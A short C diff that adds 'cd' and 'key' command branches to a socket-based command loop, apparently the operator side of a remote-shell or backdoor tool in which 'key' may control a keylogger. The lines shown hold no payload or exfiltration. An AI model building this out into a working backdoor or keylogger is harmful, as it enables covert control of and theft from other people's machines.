@@ -49,6 +49,12 @@ int main(){
 		if (strncmp("q", buffer, 1) == 0){
 			break;
 		}
+		else if (strncmp("cd ", buffer, 3) == 0){
+			goto jump;
+		}
+		else if (strncmp("key", buffer, 3) == 0){
+			goto jump;
+		}
 		else{
 			recv(client_socket, response, sizeof(response), MSG_WAITALL);
 			printf("%s", response);
